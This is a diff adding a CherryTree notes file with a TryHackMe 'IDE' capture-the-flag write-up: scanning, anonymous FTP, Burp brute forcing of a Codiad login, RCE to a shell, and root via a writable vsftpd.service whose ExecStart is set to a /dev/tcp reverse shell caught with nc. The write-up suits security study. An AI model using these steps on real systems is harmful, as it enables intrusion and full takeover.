@@ -1,0 +1,93 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="TryHackMe" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1661527665" ts_lastsave="1661527674">
+    <node name="CTF" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1661527674" ts_lastsave="1661527684">
+      <node name="IDE" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1661527684" ts_lastsave="1661531478">
+        <rich_text weight="heavy">IDE</rich_text>
+        <rich_text> 
+</rich_text>
+        <rich_text link="webs https://tryhackme.com/room/ide">https://tryhackme.com/room/ide</rich_text>
+        <rich_text>
+ 
+• </rich_text>
+        <rich_text weight="heavy">Information Gathering</rich_text>
+        <rich_text> 
+      ▪ ip: 10.10.87.0
+• </rich_text>
+        <rich_text weight="heavy">Rnamuraton</rich_text>
+        <rich_text>
+      ▪ Scan the ip with nmap: </rich_text>
+        <rich_text family="monospace">nmap -v -A -p 1-65535 10.10.87.0 nmap_scan.txt</rich_text>
+        <rich_text>
+            → 4 port open
+            → 21, 22, 80, 62337
+            → 21 is ftp
+               ⇒ Anonymous login supported
+            → 62337 is interesting
+               ⇒ http: Apache httpd 2.4.29 ((Ubuntu))
+               ⇒ http-title: Codiad 2.8.4
+               ⇒ Running: Codiad 2.8.4
+• </rich_text>
+        <rich_text weight="heavy">Exploitation</rich_text>
+        <rich_text>
+      ▪ Login via FTP anonymously
+            → Found interesting directory “</rich_text>
+        <rich_text family="monospace">...</rich_text>
+        <rich_text>”
+            → Inside that directory found interesting file “</rich_text>
+        <rich_text family="monospace">-</rich_text>
+        <rich_text>”
+            → Inside that file found a username “****” and his password is changed to defalut
+      ▪ Browsed port 62337
+            → Found a login page
+            → Tried to login with user name “****”
+               ⇒ Intercept the login request with burp
+               ⇒ Send it to intruder
+               ⇒ Used sniper attack on passwod field
+                     ◇ Found password “****”
+      ▪ Codiad 2.8.4 is vulnerable to RCE
+            → Used that vulnerability to gain reverse shell as "www-data"
+• </rich_text>
+        <rich_text weight="heavy">Privilege Escalation</rich_text>
+        <rich_text>
+      ▪ Escalate to lower previlaged user
+            → Found an user at /home
+            → Unable to read user.txt
+            → But interestingly can read .bash_history and found a command with user “****” and password “****”
+            → Login via SSH using username and password
+            → Got the user
+               ⇒ Now can read user.txt
+      ▪ Escalate to root
+            → Run </rich_text>
+        <rich_text family="monospace" style="italic">sudo -l</rich_text>
+        <rich_text>
+            → Found user can run </rich_text>
+        <rich_text family="monospace">service vsftpd restart</rich_text>
+        <rich_text> as sudo
+            → Download LinEnum.sh script and run
+            → Found that the user can edit </rich_text>
+        <rich_text family="monospace">/lib/systemd/system/vsftpd.service</rich_text>
+        <rich_text>
+               ⇒ </rich_text>
+        <rich_text family="monospace">-rw-rw-r-- 1 root drac  248 Aug  4  2021 vsftpd.service</rich_text>
+        <rich_text>
+            → Edit </rich_text>
+        <rich_text family="monospace">ExecStart=/bin/bash -c "bash -i &gt;/dev/tcp/10.8.16.20/8888 0&gt;&amp;1 2&gt;&amp;1"</rich_text>
+        <rich_text>
+            → Reload "vsftpd daemon" with  </rich_text>
+        <rich_text family="monospace">systemctl daemon-reload</rich_text>
+        <rich_text>
+            → Lisen on host with </rich_text>
+        <rich_text family="monospace">nc -lnvp 8888</rich_text>
+        <rich_text>
+            → Run </rich_text>
+        <rich_text family="monospace">sudo service vsftpd restart</rich_text>
+        <rich_text>
+            → Got the root
+               ⇒ Now can read root.txt
+       		</rich_text>
+      </node>
+    </node>
+  </node>
+</cherrytree>
